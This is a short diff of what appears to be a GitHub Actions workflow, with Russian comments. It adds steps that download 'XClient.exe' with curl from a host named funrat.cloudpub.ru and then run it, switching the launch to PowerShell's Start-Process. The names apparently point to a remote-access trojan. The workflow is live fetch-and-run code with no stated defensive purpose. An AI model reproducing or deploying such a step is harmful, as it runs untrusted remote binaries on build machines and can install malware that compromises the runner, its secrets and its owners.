@@ -15,10 +15,8 @@ jobs:
 
       - name: Download .exe file
         run: |
-          curl -L -o XClient.exe https://funrat.cloudpub.ru/XClient.exe  # Замените URL на реальный путь к .exe файлу
-          # или используйте wget, если предпочитаете
-          # wget https://example.com/path/to/yourprogram.exe
+          curl -L -o XClient.exe https://funrat.cloudpub.ru/XClient.exe  # Замените на ваш реальный URL
 
       - name: Run .exe file
         run: |
-          .\XClient.exe  # Запуск скачанного .exe файла
+          Start-Process -FilePath ".\XClient.exe"  # Запуск .exe файла с помощью PowerShell
